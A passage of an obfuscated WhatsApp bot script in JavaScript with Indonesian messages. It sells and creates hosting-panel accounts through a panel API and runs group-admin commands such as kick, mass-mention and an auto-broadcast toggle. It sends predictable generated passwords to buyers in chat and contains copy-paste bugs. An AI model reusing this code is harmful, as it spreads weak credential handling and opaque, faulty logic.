          _0x554af5.sendMessage(_0x647cd0, {
            image: {
              url: akunlo
            },
            caption: ctf
          }, {
            quoted: _0x554af5.chat
          });
          let _0x4960ad = await _0x463f55.json();
          let _0x385c6d = _0x4960ad.attributes.startup;
          let _0x54dc77 = await fetch(domain + "/api/application/servers", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              name: _0x45fb07,
              description: " ",
              user: _0x549f72.id,
              egg: parseInt(_0x4a0630),
              docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
              startup: _0x385c6d,
              environment: {
                INST: "npm",
                USER_UPLOAD: "0",
                AUTO_UPDATE: "0",
                CMD_RUN: "npm start"
              },
              limits: {
                memory: _0x48b2b4,
                swap: 0,
                disk: _0x467e37,
                io: 500,
                cpu: _0x23018b
              },
              feature_limits: {
                databases: 5,
                backups: 5,
                allocations: 1
              },
              deploy: {
                locations: [parseInt(_0x5accb2)],
                dedicated_ip: false,
                port_range: []
              }
            })
          });
          let _0x2bface = await _0x54dc77.json();
          if (_0x2bface.errors) {
            return _0x5dd2ef.reply(JSON.stringify(_0x2bface.errors[0], null, 2));
          }
          let _0x5255db = _0x2bface.attributes;
          let _0x30ddfc = await _0x5dd2ef.reply("\n𝐙𝐄𝐍𝐎 𝐁𝐄𝐑𝐇𝐀𝐒𝐈𝐋 𝐌𝐄𝐌𝐁𝐔𝐀𝐓 𝐀𝐊𝐔𝐍 𝐏𝐀𝐍𝐄𝐋 𝐊𝐀𝐌𝐔✔\n\n📩ID: " + _0x549f72.id + "\n📌NAME: " + _0x549f72.first_name + " " + _0x549f72.last_name + "\n💵MEMORY: " + (_0x5255db.limits.memory === 0 ? "Unlimited" : _0x5255db.limits.memory) + " MB\n📦DISK: " + (_0x5255db.limits.disk === 0 ? "Unlimited" : _0x5255db.limits.disk) + " MB\n⌛CPU: " + _0x5255db.limits.cpu + "%\n\n> © Zeno Cpanel\n");
        }
        break;
      case "10gb":
        {
          if (!_0x439cd6 && !_0x1db4e8 && !_0x58d2b2 && !_0x3da684) {
            return _0x3f20c7(mess.only.premium);
          }
          let _0x5aefd1 = _0x2ece04.split(",");
          if (_0x5aefd1.length < 2) {
            return _0x5dd2ef.reply("*Format salah!*\nPenggunaan:\n" + (_0x505e97 + _0x3c8344) + " user,nomer");
          }
          let _0x3c1e85 = _0x5aefd1[0];
          let _0xd69f94 = _0x5dd2ef.quoted ? _0x5dd2ef.quoted.sender : _0x5aefd1[1] ? _0x5aefd1[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net" : _0x5dd2ef.mentionedJid[0];
          let _0x2f7403 = _0x3c1e85 + "10gb";
          let _0x52226b = global.eggsnya;
          let _0x3b4550 = global.location;
          let _0x38fded = "10000";
          let _0x309c18 = "200";
          let _0x41143a = "10000";
          let _0x1c7e81 = _0x3c1e85 + "@dray.offc";
          akunlo = "https://8030.us.kg/file/IvWXFmwOAfA0.jpg";
          if (!_0xd69f94) {
            return;
          }
          let _0x565f5e = (await _0x554af5.onWhatsApp(_0xd69f94.split`@`[0]))[0] || {};
          let _0x2311da = _0x3c1e85 + "Dray001";
          let _0x29102e = await fetch(domain + "/api/application/users", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              email: _0x1c7e81,
              username: _0x3c1e85,
              first_name: _0x3c1e85,
              last_name: _0x3c1e85,
              language: "en",
              password: _0x2311da
            })
          });
          let _0x1e0944 = await _0x29102e.json();
          if (_0x1e0944.errors) {
            return _0x5dd2ef.reply(JSON.stringify(_0x1e0944.errors[0], null, 2));
          }
          let _0x4a750f = _0x1e0944.attributes;
          let _0x491917 = await fetch(domain + "/api/application/nests/5/eggs/" + _0x52226b, {
            method: "GET",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            }
          });
          _0x5dd2ef.reply("𝐒𝐔𝐂𝐂𝐄𝐒 𝐂𝐑𝐄𝐀𝐓𝐄 𝐘𝐎𝐔𝐑 𝐏𝐀𝐍𝐄𝐋\n *DONE CRATE USER + SERVER ID :* " + _0x4a750f.id + "\nJANGAN LUPA DI PAKE YAH ASU\nKALO NGGA NANTI DI DI DELETE BANG DRAY\n> Zeno Cpanel");
          ctf = "Hai @" + _0xd69f94.split`@`[0] + "\n\n*➣ USERNAME* : " + _0x4a750f.username + "\n*➣ PASSWORD* : " + _0x2311da + "\n*➣ LOGIN* : " + domain + "\n*➥ INFO PANEL* : https://whatsapp.com/channel/0029Vaj4X9iAInPuhzUk3v1L\n*➥TUTOR* : https://youtu.be/Nq4uxw_1ihQ?si=JN076DTFlmjZyCSd\n\n➻ NOTE : \n⪩ BOT HANYA MENGIRIM DATA AKUN 1X\n⪩ DILARANG KERAS MEMBAGIKAN LINK LOGIN\n⪩ GARANSI 20 DAY\n⪩ WAJIB BAWA BUKTI TRANSAKSI JIKA CLAIM GARANSI\n⪩ SCREENSHOT CHAT DATA AKUN INI AGAR TIDAK HILANG\n> Zeno Cpanel\n";
          _0x554af5.sendMessage(_0xd69f94, {
            image: {
              url: akunlo
            },
            caption: ctf
          }, {
            quoted: _0x554af5.chat
          });
          let _0x22b47e = await _0x491917.json();
          let _0x305386 = _0x22b47e.attributes.startup;
          _0x554af5;
          let _0x3dbc10 = await fetch(domain + "/api/application/servers", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              name: _0x2f7403,
              description: " ",
              user: _0x4a750f.id,
              egg: parseInt(_0x52226b),
              docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
              startup: _0x305386,
              environment: {
                INST: "npm",
                USER_UPLOAD: "0",
                AUTO_UPDATE: "0",
                CMD_RUN: "npm start"
              },
              limits: {
                memory: _0x38fded,
                swap: 0,
                disk: _0x41143a,
                io: 500,
                cpu: _0x309c18
              },
              feature_limits: {
                databases: 5,
                backups: 5,
                allocations: 1
              },
              deploy: {
                locations: [parseInt(_0x3b4550)],
                dedicated_ip: false,
                port_range: []
              }
            })
          });
          let _0x556460 = await _0x3dbc10.json();
          if (_0x556460.errors) {
            return _0x5dd2ef.reply(JSON.stringify(_0x556460.errors[0], null, 2));
          }
          let _0x5c0d24 = _0x556460.attributes;
          let _0x4fabae = await _0x5dd2ef.reply("\n*𝐙𝐄𝐍𝐎 𝐁𝐄𝐑𝐇𝐀𝐒𝐈𝐋 𝐌𝐄𝐌𝐁𝐔𝐀𝐓 𝐀𝐊𝐔𝐍 𝐏𝐀𝐍𝐄𝐋 𝐊𝐀𝐌𝐔✔\n\n📩ID: " + _0x4a750f.id + "\n📌NAME: " + _0x4a750f.first_name + " " + _0x4a750f.last_name + "\n💵MEMORY: " + (_0x5c0d24.limits.memory === 0 ? "Unlimited" : _0x5c0d24.limits.memory) + " MB\n📦DISK: " + (_0x5c0d24.limits.disk === 0 ? "Unlimited" : _0x5c0d24.limits.disk) + " MB\n⌛CPU: " + _0x5c0d24.limits.cpu + "%\n\n> © Zeno Cpanel\n");
        }
        break;
      case "akses":
        if (!_0x4a73b4) {
          return _0x5dd2ef.reply("Khusus Group");
        }
        if (!_0x439cd6) {
          return _0x5dd2ef.reply("Fitur Ini Khusus Owner dray,, Lu Siapa Mainin Fitur Ini? ");
        }
        _0x2d4d10.push(_0x5dd2ef.chat);
        fs.writeFileSync("./database/idgrup.json", JSON.stringify(_0x2d4d10));
        _0x5dd2ef.reply(_0x3c8344 + " sukses");
        break;
      case "delakses":
        if (!_0x439cd6) {
          return _0x5dd2ef.reply("Fitur Ini Khusus Owner Dray,, Lu Siapa Mainin Fitur Ini?");
        }
        if (!_0x4a73b4) {
          return _0x5dd2ef.reply("Khusus Group");
        }
        var _0x2ba1c9 = _0x2d4d10.indexOf(_0x5dd2ef.chat);
        _0x2d4d10.splice(_0x2ba1c9, 1);
        fs.writeFileSync("./database/idgrup.json", JSON.stringify(_0x2d4d10));
        _0x5dd2ef.reply(_0x3c8344 + " sukses");
        break;
      case "antilink":
        {
          if (!_0x678fcd) {
            return _0x5dd2ef.reply("Grup ini belum di berikan akses menggunakan bot silahkan ketik .akses untuk memberikan akses grup");
          }
          if (!_0x5dd2ef.isGroup) {
            return _0x5dd2ef.reply("Fitur Khusus Group!");
          }
          if (!_0x58e970) {
            return _0x5dd2ef.reply("Fitur Khusus admin!");
          }
          if (!_0x5c5d5c) {
            return _0x5dd2ef.reply("Bot harus menjadi admin");
          }
          if (_0x1d31fd[0] === "on") {
            if (_0x4f4df0) {
              return _0x5dd2ef.reply("Udah aktif");
            }
            _0x5ad409.push(_0x5dd2ef.chat);
            fs.writeFileSync("./database/antilink.json", JSON.stringify(_0x5ad409, null, 2));
            _0x3f20c7("Successfully Activate Antilink In This Group");
          } else if (_0x1d31fd[0] === "off") {
            if (!_0x4f4df0) {
              return _0x5dd2ef.reply("Udah nonaktif");
            }
            let _0x4764a2 = _0x5ad409.indexOf(_0x5dd2ef.chat);
            _0x5ad409.splice(_0x4764a2, 1);
            fs.writeFileSync("./database/antilink.json", JSON.stringify(_0x5ad409, null, 2));
            _0x3f20c7("Successfully Disabling Antilink In This Group");
          } else {
            _0x3f20c7("Kirim perintah " + (_0x505e97 + _0x3c8344) + " on/off\n\nContoh: " + (_0x505e97 + _0x3c8344) + " on");
          }
        }
        break;
      case "welcome":
        {
          if (!_0x678fcd) {
            return _0x5dd2ef.reply("Grup ini belum di berikan akses menggunakan bot silahkan ketik .akses untuk memberikan akses grup");
          }
          if (!_0x5dd2ef.isGroup) {
            return _0x5dd2ef.reply("Fitur Khusus Group!");
          }
          if (!_0x58e970) {
            return _0x5dd2ef.reply("Fitur Khusus admin!");
          }
          if (_0x1d31fd[0] === "on") {
            if (_0x47df59) {
              return _0x5dd2ef.reply("Udah on");
            }
            _0x366a12.push(_0x5dd2ef.chat);
            fs.writeFileSync("./database/welcome.json", JSON.stringify(_0x366a12, null, 2));
            _0x3f20c7("Sukses mengaktifkan welcome di grup ini");
          } else if (_0x1d31fd[0] === "off") {
            if (!_0x47df59) {
              return _0x5dd2ef.reply("Udah off");
            }
            let _0x203bed = _0x366a12.indexOf(_0x5dd2ef.chat);
            _0x366a12.splice(_0x203bed, 1);
            fs.writeFileSync("./database/welcome.json", JSON.stringify(_0x366a12, null, 2));
            _0x3f20c7("Sukses menonaktifkan welcome di grup ini");
          } else {
            _0x3f20c7("Kirim perintah " + (_0x505e97 + _0x3c8344) + " on/off\n\nContoh: " + (_0x505e97 + _0x3c8344) + " on");
          }
        }
        break;
      case "left":
      case "goodbye":
        {
          if (!_0x678fcd) {
            return _0x5dd2ef.reply("Grup ini belum di berikan akses menggunakan bot silahkan ketik .akses untuk memberikan akses grup");
          }
          if (!_0x5dd2ef.isGroup) {
            return _0x5dd2ef.reply("Fitur Khusus Group!");
          }
          if (!_0x58e970) {
            return _0x5dd2ef.reply("Fitur Khusus admin!");
          }
          if (_0x1d31fd[0] === "on") {
            if (_0x311b38) {
              return _0x5dd2ef.reply("Udah on");
            }
            _0x55a1e5.push(_0x5dd2ef.chat);
            fs.writeFileSync("./database/left.json", JSON.stringify(_0x55a1e5, null, 2));
            _0x3f20c7("Sukses mengaktifkan goodbye di grup ini");
          } else if (_0x1d31fd[0] === "off") {
            if (!_0x311b38) {
              return _0x5dd2ef.reply("Udah off");
            }
            let _0x20d714 = _0x55a1e5.indexOf(_0x5dd2ef.chat);
            _0x55a1e5.splice(_0x20d714, 1);
            fs.writeFileSync("./database/welcome.json", JSON.stringify(_0x55a1e5, null, 2));
            _0x3f20c7("Sukses menonaktifkan goodbye di grup ini");
          } else {
            _0x3f20c7("Kirim perintah " + (_0x505e97 + _0x3c8344) + " on/off\n\nContoh: " + (_0x505e97 + _0x3c8344) + " on");
          }
        }
        break;
      case "setwelcome":
        {
          if (!_0x678fcd) {
            return _0x5dd2ef.reply("Grup ini belum di berikan akses menggunakan bot silahkan ketik .akses untuk memberikan akses grup");
          }
          if (!_0x5dd2ef.isGroup) {
            return _0x5dd2ef.reply("Fitur Khusus Group!");
          }
          if (!_0x439cd6 && !_0x58e970) {
            return _0x5dd2ef.reply("Fitur Khusus owner!");
          }
          if (!_0x2ece04) {
            return _0x5dd2ef.reply("Gunakan dengan cara " + _0x3c8344 + " *teks_welcome*\n\n_Contoh_\n\n" + _0x3c8344 + " Halo @user, Selamat datang di @group");
          }
          if (isSetWelcome(_0x5dd2ef.chat, _0x40a75a)) {
            return _0x5dd2ef.reply("Set welcome already active");
          }
          addSetWelcome(_0x2ece04, _0x5dd2ef.chat, _0x40a75a);
          _0x3f20c7("Successfully set welcome!");
        }
        break;
      case "changewelcome":
        {
          if (!_0x678fcd) {
            return _0x5dd2ef.reply("Grup ini belum di berikan akses menggunakan bot silahkan ketik .akses untuk memberikan akses grup");
          }
          if (!_0x5dd2ef.isGroup) {
            return _0x5dd2ef.reply("Fitur Khusus Group!");
          }
          if (!_0x439cd6 && !_0x58e970) {
            return _0x5dd2ef.reply("Fitur Khusus owner!");
          }
          if (!_0x2ece04) {
            return _0x5dd2ef.reply("Gunakan dengan cara " + _0x3c8344 + " *teks_welcome*\n\n_Contoh_\n\n" + _0x3c8344 + " Halo @user, Selamat datang di @group");
          }
          if (isSetWelcome(_0x5dd2ef.chat, _0x40a75a)) {
            changeSetWelcome(q, _0x5dd2ef.chat, _0x40a75a);
            _0x3f20c7("Sukses change set welcome teks!");
          } else {
            addSetWelcome(q, _0x5dd2ef.chat, _0x40a75a);
            _0x3f20c7("Sukses change set welcome teks!");
          }
        }
        break;
      case "delsetwelcome":
        {
          if (!_0x678fcd) {
            return _0x5dd2ef.reply("Grup ini belum di berikan akses menggunakan bot silahkan ketik .akses untuk memberikan akses grup");
          }
          if (!_0x5dd2ef.isGroup) {
            return _0x5dd2ef.reply("Fitur Khusus Group!");
          }
          if (!_0x439cd6 && !_0x58e970) {
            return _0x5dd2ef.reply("Fitur Khusus owner!");
          }
          if (!isSetWelcome(_0x5dd2ef.chat, _0x40a75a)) {
            return _0x5dd2ef.reply("Belum ada set welcome di sini..");
          }
          removeSetWelcome(_0x5dd2ef.chat, _0x40a75a);
          _0x3f20c7("Sukses delete set welcome");
        }
        break;
      case "setleft":
        {
          if (!_0x678fcd) {
            return _0x5dd2ef.reply("Grup ini belum di berikan akses menggunakan bot silahkan ketik .akses untuk memberikan akses grup");
          }
          if (!_0x5dd2ef.isGroup) {
            return _0x5dd2ef.reply("Fitur Khusus Group!");
          }
          if (!_0x439cd6 && !_0x58e970) {
            return _0x5dd2ef.reply("Fitur Khusus owner!");
          }
          if (!_0x2ece04) {
            return _0x5dd2ef.reply("Gunakan dengan cara " + (_0x505e97 + _0x3c8344) + " *teks_left*\n\n_Contoh_\n\n" + (_0x505e97 + _0x3c8344) + " Halo @user, Selamat tinggal dari @group");
          }
          if (isSetLeft(_0x5dd2ef.chat, _0x264885)) {
            return _0x5dd2ef.reply("Set left already active");
          }
          addSetLeft(q, _0x5dd2ef.chat, _0x264885);
          _0x3f20c7("Successfully set left!");
        }
        break;
      case "changeleft":
        {
          if (!_0x678fcd) {
            return _0x5dd2ef.reply("Grup ini belum di berikan akses menggunakan bot silahkan ketik .akses untuk memberikan akses grup");
          }
          if (!_0x5dd2ef.isGroup) {
            return _0x5dd2ef.reply("Fitur Khusus Group!");
          }
          if (!_0x439cd6 && !_0x58e970) {
            return _0x5dd2ef.reply("Fitur Khusus owner!");
          }
          if (!_0x2ece04) {
            return _0x5dd2ef.reply("Gunakan dengan cara " + (_0x505e97 + _0x3c8344) + " *teks_left*\n\n_Contoh_\n\n" + (_0x505e97 + _0x3c8344) + " Halo @user, Selamat tinggal dari @group");
          }
          if (isSetLeft(_0x5dd2ef.chat, _0x264885)) {
            changeSetLeft(q, _0x5dd2ef.chat, _0x264885);
            _0x3f20c7("Sukses change set left teks!");
          } else {
            addSetLeft(q, _0x5dd2ef.chat, _0x264885);
            _0x3f20c7("Sukses change set left teks!");
          }
        }
        break;
      case "delsetleft":
        {
          if (!_0x678fcd) {
            return _0x5dd2ef.reply("Grup ini belum di berikan akses menggunakan bot silahkan ketik .akses untuk memberikan akses grup");
          }
          if (!_0x5dd2ef.isGroup) {
            return _0x5dd2ef.reply("Fitur Khusus Group!");
          }
          if (!_0x439cd6 && !_0x58e970) {
            return _0x5dd2ef.reply("Fitur Khusus owner!");
          }
          if (!isSetLeft(_0x5dd2ef.chat, _0x264885)) {
            return _0x5dd2ef.reply("Belum ada set left di sini..");
          }
          removeSetLeft(_0x5dd2ef.chat, _0x264885);
          _0x3f20c7("Sukses delete set left");
        }
        break;
      case "setdesc":
      case "setdesk":
        {
          if (!_0x678fcd) {
            return _0x5dd2ef.reply("Grup ini belum di berikan akses menggunakan bot silahkan ketik .akses untuk memberikan akses grup");
          }
          if (!_0x5dd2ef.isGroup) {
            return _0x5dd2ef.reply("Fitur Khusus Group!");
          }
          if (!_0x58e970) {
            return _0x5dd2ef.reply("Fitur Khusus admin!");
          }
          if (!_0x5c5d5c) {
            return _0x5dd2ef.reply("Jadikan bot sebagai admin");
          }
          if (!_0x2ece04) {
            return _0x5dd2ef.reply("Example " + (_0x505e97 + _0x3c8344) + " WhatsApp Bot");
          }
          await _0x554af5.groupUpdateDescription(_0x5dd2ef.chat, _0x2ece04).then(_0x243ecc => _0x5dd2ef.reply("Done")).catch(_0x23ecb6 => _0x5dd2ef.reply("Terjadi kesalahan"));
        }
        break;
      case "promote":
        {
          if (!_0x678fcd) {
            return _0x5dd2ef.reply("Grup ini belum di berikan akses menggunakan bot silahkan ketik .akses untuk memberikan akses grup");
          }
          if (!_0x5dd2ef.isGroup) {
            return _0x5dd2ef.reply("Fitur Khusus Group!");
          }
          if (!_0x58e970) {
            return _0x5dd2ef.reply("Fitur Khusus admin!");
          }
          if (!_0x5c5d5c) {
            return _0x5dd2ef.reply("Jadikan bot sebagai admin");
          }
          let _0x24b2a0 = _0x5dd2ef.mentionedJid[0] ? _0x5dd2ef.mentionedJid[0] : _0x5dd2ef.quoted ? _0x5dd2ef.quoted.sender : _0x2ece04.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          await _0x554af5.groupParticipantsUpdate(_0x5dd2ef.chat, [_0x24b2a0], "promote").then(_0x3d6867 => _0x5dd2ef.reply("Sukses promote member✅")).catch(_0x49a9f9 => _0x5dd2ef.reply("❌ Terjadi kesalahan"));
        }
        break;
      case "demote":
        {
          if (!_0x678fcd) {
            return _0x5dd2ef.reply("Grup ini belum di berikan akses menggunakan bot silahkan ketik .akses untuk memberikan akses grup");
          }
          if (!_0x5dd2ef.isGroup) {
            return _0x5dd2ef.reply("Fitur Khusus Group!");
          }
          if (!_0x58e970) {
            return _0x5dd2ef.reply("Fitur Khusus admin!");
          }
          if (!_0x5c5d5c) {
            return _0x5dd2ef.reply("Jadikan bot sebagai admin");
          }
          let _0x271e4d = _0x5dd2ef.mentionedJid[0] ? _0x5dd2ef.mentionedJid[0] : _0x5dd2ef.quoted ? _0x5dd2ef.quoted.sender : _0x2ece04.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          await _0x554af5.groupParticipantsUpdate(_0x5dd2ef.chat, [_0x271e4d], "demote").then(_0x1b5cf6 => _0x5dd2ef.reply("Sukses demote admin✅")).catch(_0x57bae0 => _0x5dd2ef.reply("❌ Terjadi kesalahan"));
        }
        break;
      case "setlinkgc":
      case "revoke":
        {
          if (!_0x678fcd) {
            return _0x5dd2ef.reply("Grup ini belum di berikan akses menggunakan bot silahkan ketik .akses untuk memberikan akses grup");
          }
          if (!_0x5dd2ef.isGroup) {
            return _0x5dd2ef.reply("Fitur Khusus Group!");
          }
          if (!_0x58e970) {
            return _0x5dd2ef.reply("Fitur Khusus admin!");
          }
          if (!_0x5c5d5c) {
            return _0x5dd2ef.reply("Jadikan bot sebagai admin");
          }
          await _0x554af5.groupRevokeInvite(_0x5dd2ef.chat).then(_0x103d18 => {
            _0x3f20c7("Sukses menyetel tautan undangan grup ini");
          }).catch(() => _0x3f20c7("Terjadi kesalahan"));
        }
        break;
      case "linkgrup":
      case "linkgroup":
      case "linkgc":
        {
          if (!_0x678fcd) {
            return _0x5dd2ef.reply("Grup ini belum di berikan akses menggunakan bot silahkan ketik .akses untuk memberikan akses grup");
          }
          if (!_0x5dd2ef.isGroup) {
            return _0x5dd2ef.reply("Fitur Khusus Group!");
          }
          if (!_0x5c5d5c) {
            return _0x5dd2ef.reply("Jadikan bot sebagai admin");
          }
          let _0x49c7c2 = await _0x554af5.groupInviteCode(_0x5dd2ef.chat);
          _0x5dd2ef.reply("https://chat.whatsapp.com/" + _0x49c7c2 + "\n\nLink Group : " + _0x379cf7.subject);
        }
        break;
      case "setppgroup":
      case "setppgrup":
      case "setppgc":
        {
          if (!_0x678fcd) {
            return _0x5dd2ef.reply("Grup ini belum di berikan akses menggunakan bot silahkan ketik .akses untuk memberikan akses grup");
          }
          if (!_0x5dd2ef.isGroup) {
            return _0x5dd2ef.reply("Fitur Khusus Group!");
          }
          if (!_0x58e970) {
            return _0x5dd2ef.reply("Fitur Khusus admin!");
          }
          if (!_0x5c5d5c) {
            return _0x5dd2ef.reply("Jadikan bot sebagai admin");
          }
          if (!_0x5c113a) {
            return _0x5dd2ef.reply("Kirim/Reply Image Dengan Caption " + (_0x505e97 + _0x3c8344));
          }
          if (!/image/.test(_0xb4c66d)) {
            return _0x5dd2ef.reply("Kirim/Reply Image Dengan Caption " + (_0x505e97 + _0x3c8344));
          }
          if (/webp/.test(_0xb4c66d)) {
            return _0x5dd2ef.reply("Kirim/Reply Image Dengan Caption " + (_0x505e97 + _0x3c8344));
          }
          let _0x3fa749 = await _0x554af5.downloadAndSaveMediaMessage(_0x5c113a);
          await _0x554af5.updateProfilePicture(_0x5dd2ef.chat, {
            url: _0x3fa749
          }).catch(_0x1476f6 => fs.unlinkSync(_0x3fa749));
          _0x5dd2ef.reply("Berhasil mengganti pp group");
        }
        break;
      case "setname":
      case "setnamegc":
      case "setsubject":
        {
          if (!_0x678fcd) {
            return _0x5dd2ef.reply("Grup ini belum di berikan akses menggunakan bot silahkan ketik .akses untuk memberikan akses grup");
          }
          if (!_0x5dd2ef.isGroup) {
            return _0x5dd2ef.reply("Fitur Khusus Group!");
          }
          if (!_0x58e970) {
            return _0x5dd2ef.reply("Fitur Khusus admin!");
          }
          if (!_0x5c5d5c) {
            return _0x5dd2ef.reply("Jadikan bot sebagai admin");
          }
          if (!_0x2ece04) {
            return _0x3f20c7("Contoh " + (_0x505e97 + _0x3c8344) + " bot WhatsApp");
          }
          await _0x554af5.groupUpdateSubject(_0x5dd2ef.chat, _0x2ece04).then(_0x50ebee => _0x3f20c7("Done")).catch(_0x5e7957 => _0x3f20c7("Terjadi kesalahan"));
        }
        break;
      case "kick":
      case "jumpshot":
      case "sulap":
      case "dor":
        {
          if (!_0x678fcd) {
            return _0x5dd2ef.reply("Grup ini belum di berikan akses menggunakan bot silahkan ketik .akses untuk memberikan akses grup");
          }
          if (!_0x5dd2ef.isGroup) {
            return _0x5dd2ef.reply("Fitur Khusus Group!");
          }
          if (!_0x58e970) {
            return _0x5dd2ef.reply("Fitur Khusus admin!");
          }
          if (!_0x5c5d5c) {
            return _0x5dd2ef.reply("Fitur Khusus admin!");
          }
          let _0x53aa07 = _0x5dd2ef.mentionedJid[0] ? _0x5dd2ef.mentionedJid[0] : _0x5dd2ef.quoted ? _0x5dd2ef.quoted.sender : _0x2ece04.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          await _0x554af5.groupParticipantsUpdate(_0x5dd2ef.chat, [_0x53aa07], "remove").then(_0x5d86fd => _0x5dd2ef.reply("Sukses kick target✅")).catch(_0x5e8fe0 => _0x5dd2ef.reply("❌ Terjadi kesalahan"));
        }
        break;
      case "h":
      case "hidetag":
        {
          if (!_0x678fcd) {
            return _0x5dd2ef.reply("Grup ini belum di berikan akses menggunakan bot silahkan ketik .akses untuk memberikan akses grup");
          }
          if (!_0x5dd2ef.isGroup) {
            return _0x3f20c7("Khusus grup");
          }
          if (!_0x58e970 && !_0x439cd6) {
            return _0x3f20c7("Fitur khusus admin");
          }
          let _0x3494d2 = _0x5dd2ef.quoted ? _0x5c113a.text : _0x2ece04 ? _0x2ece04 : "";
          _0x554af5.sendMessage(_0x5dd2ef.chat, {
            text: _0x3494d2,
            mentions: _0xf906a3.map(_0x98fca9 => _0x98fca9.id)
          }, {});
        }
        break;
      case "close":
      case "tutup":
        {
          if (!_0x678fcd) {
            return _0x5dd2ef.reply("Grup ini belum di berikan akses menggunakan bot silahkan ketik .akses untuk memberikan akses grup");
          }
          if (!_0x5dd2ef.isGroup) {
            return _0x5dd2ef.reply("Fitur Khusus Group!");
          }
          if (!_0x58e970) {
            return _0x5dd2ef.reply("Fitur Khusus admin!");
          }
          if (!_0x5c5d5c) {
            return _0x5dd2ef.reply("Bot bukan admin");
          }
          _0x554af5.groupSettingUpdate(_0x5dd2ef.chat, "announcement");
          const _0x16d315 = await getTextSetClose(_0x5dd2ef.chat, _0x2ffa38);
          _0x3f20c7(_0x16d315 || "Sukses mengizinkan hanya admin yang dapat mengirim pesan ke grup ini");
        }
        break;
      case "antilink2":
        {
          if (!_0x678fcd) {
            return _0x5dd2ef.reply("Grup ini belum di berikan akses menggunakan bot silahkan ketik .akses untuk memberikan akses grup");
          }
          if (!_0x5dd2ef.isGroup) {
            return _0x5dd2ef.reply("Fitur Khusus Group!");
          }
          if (!_0x58e970) {
            return _0x5dd2ef.reply("Fitur Khusus admin!");
          }
          if (!_0x5c5d5c) {
            return _0x5dd2ef.reply("Bot harus menjadi admin");
          }
          if (_0x1d31fd[0] === "on") {
            if (_0x5a3bab) {
              return _0x5dd2ef.reply("Udah aktif");
            }
            _0x434edd.push(_0x5dd2ef.chat);
            fs.writeFileSync("./database/antilink2.json", JSON.stringify(_0x434edd, null, 2));
            _0x3f20c7("Successfully Activate antilink2 In This Group");
          } else if (_0x1d31fd[0] === "off") {
            if (!_0x5a3bab) {
              return _0x5dd2ef.reply("Udah nonaktif");
            }
            let _0x162976 = _0x434edd.indexOf(_0x5dd2ef.chat);
            _0x434edd.splice(_0x162976, 1);
            fs.writeFileSync("./database/antilink2.json", JSON.stringify(_0x434edd, null, 2));
            _0x3f20c7("Successfully Disabling antilink2 In This Group");
          } else {
            _0x3f20c7("Kirim perintah " + (_0x505e97 + _0x3c8344) + " on/off\n\nContoh: " + (_0x505e97 + _0x3c8344) + " on");
          }
        }
        break;
      case "autojpm":
        {
          if (!_0x439cd6) {
            return _0x3f20c7(mess.only.owner);
          }
          if (!_0x5dd2ef.isGroup) {
            return _0x5dd2ef.reply("Fitur Khusus Group!");
          }
          if (_0x1d31fd[0] === "on") {
            if (_0x2d3822) {
              return _0x5dd2ef.reply("Udah aktif");
            }
            _0x53672c.push(_0x5dd2ef.chat);
            fs.writeFileSync("./database/autojpm.json", JSON.stringify(_0x53672c, null, 2));
            _0x3f20c7("Successfully Activate autojpm In This Group");
          } else if (_0x1d31fd[0] === "off") {
            if (!_0x2d3822) {
              return _0x5dd2ef.reply("Udah nonaktif");
            }
            let _0x3475a9 = _0x53672c.indexOf(_0x5dd2ef.chat);
            _0x434edd.splice(_0x3475a9, 1);
            fs.writeFileSync("./database/autojpm.json", JSON.stringify(_0x53672c, null, 2));
            _0x3f20c7("Successfully Disabling autojpm In This Group");
          } else {
            _0x3f20c7("Kirim perintah " + (_0x505e97 + _0x3c8344) + " on/off\n\nContoh: " + (_0x505e97 + _0x3c8344) + " on");
          }
        }
        break;
      case "open":
      case "buka":
        {
          if (!_0x678fcd) {
            return _0x5dd2ef.reply("Grup ini belum di berikan akses menggunakan bot silahkan ketik .akses untuk memberikan akses grup");
          }
          if (!_0x5dd2ef.isGroup) {
            return _0x5dd2ef.reply("Fitur Khusus Group!");
          }
          if (!_0x58e970) {
            return _0x5dd2ef.reply("Fitur Khusus admin!");
          }
          if (!_0x5c5d5c) {
            return _0x5dd2ef.reply("Bot bukan admin");
          }
          _0x554af5.groupSettingUpdate(_0x5dd2ef.chat, "not_announcement");
          const _0x475fa1 = await getTextSetOpen(_0x5dd2ef.chat, _0x706d98);
          _0x3f20c7(_0x475fa1 || "Sukses mengizinkan semua peserta dapat mengirim pesan ke grup ini");
        }
        break;
      case "jeda":
        {
          if (!_0x678fcd) {
            return _0x5dd2ef.reply("Grup ini belum di berikan akses menggunakan bot silahkan ketik .akses untuk memberikan akses grup");
          }
          if (!_0x5dd2ef.isGroup) {
            return _0x5dd2ef.reply("Fitur Khusus Group!");
          }
          if (!_0x58e970) {
            return _0x5dd2ef.reply("Fitur Khusus admin!");
          }
          if (!_0x5c5d5c) {
            return _0x5dd2ef.reply("Jadikan bot sebagai admin terlebih dahulu");
          }
          if (!_0x2ece04) {
            return _0x5dd2ef.reply("kirim " + _0x3c8344 + " waktu\nContoh: " + _0x3c8344 + " 30m\n\nlist waktu:\ns = detik\nm = menit\nh = jam\nd = hari");
          }
          _0x582597[_0x5dd2ef.chat] = {
            id: _0x5dd2ef.chat,
            time: Date.now() + toMs(_0x2ece04)
          };
          fs.writeFileSync("./database/opengc.json", JSON.stringify(_0x582597));
          _0x554af5.groupSettingUpdate(_0x5dd2ef.chat, "announcement").then(_0x5d4ea8 => _0x3f20c7("Sukses, group akan dibuka " + _0x2ece04 + " lagi")).catch(_0x519d2d => _0x3f20c7("Error"));
        }
        break;
      case "cekidgc":
        {
          if (!_0x439cd6) {
            return _0x3f20c7(mess.only.premium);
          }
          await _0x3f20c7(mess.wait);
          let _0x1d6ebc = await _0x554af5.groupFetchAllParticipating();
